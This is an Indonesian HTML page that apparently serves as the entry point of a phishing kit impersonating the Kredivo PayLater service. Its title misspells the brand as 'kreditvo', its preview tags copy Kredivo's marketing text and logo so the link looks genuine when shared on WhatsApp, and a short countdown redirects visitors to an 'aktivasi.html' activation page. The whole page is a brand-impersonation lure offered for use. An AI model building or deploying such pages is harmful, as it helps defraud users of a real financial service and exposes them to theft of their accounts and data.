<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masuk ke kreditvo</title>
    <!-- KODE AGAR TAMPILAN DI WHATSAPP LEBIH BAGUS -->
     <meta property="og:title" content="Kredivo">
     <meta property="og:description" content=" Kredivo PayLater Fitur pembayaran Beli Sekarang, Bayar Nanti yang memudahkan kamu berbelanja di Kredivo tanpa harus membayar penuh di awal. Pilih cicilan 3, 6, 9, atau 12 bulan sesuai keinginan !">
     <meta property="og:image" content="kredit-logo1.jpg"> <!-- Opsional: Ganti dengan nama gambar kamu -->
     <meta name="theme-color" content="#FF0050">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000000;
        }

        /* Style Gambar */
        #gambarPembuka {
            width: 100%;
            height: 100%;
            object-fit: contain; 
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }

        
        }
    </style>
</head>
<body>

    <img id="gambarPembuka" src="kredit-logo1.jpg" alt="kreditvo">
    <div id="timer">5</div>

    <script>
        let waktu = 3;
        let timerDisplay = document.getElementById('timer');
        
        let hitungMundur = setInterval(function() {
            waktu--;
            timerDisplay.textContent = waktu;
            
            if(waktu <= 0) {
                clearInterval(hitungMundur);
                // Pindah ke halaman aktivasi.html
                window.location.href = "aktivasi.html"; 
            }
        }, 1000);
    </script>

</body>
</html>
